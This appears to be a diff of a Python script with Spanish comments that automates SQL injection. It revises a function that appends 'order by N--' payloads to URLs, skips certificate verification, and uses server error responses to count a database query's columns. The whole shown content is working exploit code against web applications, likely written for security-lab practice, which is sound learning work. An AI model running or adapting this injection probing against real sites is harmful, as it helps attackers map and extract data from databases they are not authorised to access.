@@ -73,18 +73,23 @@ def find_urls_to_test(url, base_url):
 
 # Prueba la inyección SQL buscando "Internal Server Error" u otros indicadores
 def exploit_sqli_column_number(url):
-    for i in range(1, 50):
-        sql_payload = "'+order+by+%s--" % i
-        r = requests.get(url + sql_payload, verify=False, proxies=proxies)
+    for i in range(1, 5):
+        if "?" in url:
+            target_url = url + "'+order+by+%s--" % i
+        else:
+            target_url = url + "/'+order+by+%s--" % i
+        #target_url = url + "'+order+by+%s--" % i   
+        print(f"Testing URL: {target_url}")
+        
+        r = requests.get(target_url, verify=False, proxies=proxies)
         res = r.text
-        if "Internal Server Error" in res or "SQL" in res:
+        if "Internal Server Error" in res:
             return i - 1
     return False
 
 if __name__ == "__main__":
     try:
         base_url = sys.argv[1].strip()
-        # Asegúrate de que la base_url no termine con '/'
         base_url = base_url.rstrip('/')
     except IndexError:
         print("[-] Usage: %s <base_url>" % sys.argv[0])
